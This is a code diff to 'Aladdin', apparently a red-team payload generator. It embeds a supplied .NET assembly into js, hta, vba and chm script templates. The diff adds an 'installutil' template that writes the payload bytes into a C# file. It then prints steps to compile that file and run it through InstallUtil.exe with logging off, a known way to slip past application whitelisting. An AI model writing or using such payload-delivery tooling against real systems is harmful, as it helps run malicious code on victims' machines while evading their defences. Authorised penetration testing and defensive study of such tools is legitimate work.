@@ -304,7 +304,7 @@ namespace Aladdin
             bool showhelp = false;
 
             OptionSet options = new OptionSet(){
-                {"w|scriptType=","Set to js / hta / vba / chm.\n", v =>template=v},
+                {"w|scriptType=","Set to js / hta / vba / chm / installutil\n", v =>template=v},
                 {"o|output=","The generated output, e.g: -o C:\\Users\\Nettitude\\Desktop\\payload \n", v =>output=v},
                 {"a|assembly=","Provided Assembly DLL, e.g: -a C:\\Users\\Nettitude\\Desktop\\popcalc.dll \n", v => assembly=v},
                 {"h|help","Help", v => {showhelp=true; }}
@@ -327,6 +327,9 @@ namespace Aladdin
                         break;
                     case "chm":
                         resourceName = Properties.Resources.chmps1_template.ToLower();
+                        break;
+                    case "installutil":
+                        resourceName = Properties.Resources.installutilcs_template.ToLower();
                         break;
                     default:
                         Help(options);
@@ -462,6 +465,12 @@ namespace Aladdin
                 case "hta":
                     File.WriteAllText(output + ".hta", Properties.Resources.htascript_template.Replace("%BYTES%",
                                     String.Join("," + Environment.NewLine, mapped.Select(b => String.Format("0x{0:X}", b)))));
+                    break;
+                case "installutil":
+                    File.WriteAllText(output + ".cs", Properties.Resources.installutilcs_template.Replace("%BYTES%",
+                                    String.Join("," + Environment.NewLine, mapped.Select(b => String.Format("0x{0:X}", b)))));
+                    Console.WriteLine("[*] Make sure to compile the CS file from a developer console with 'csc /out:file.exe file.cs'");
+                    Console.WriteLine("[*] Run with 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U file.exe'");
                     break;
                 default:
                     File.WriteAllText(output + ".js", Properties.Resources.jscript_template.Replace("%BYTES%",
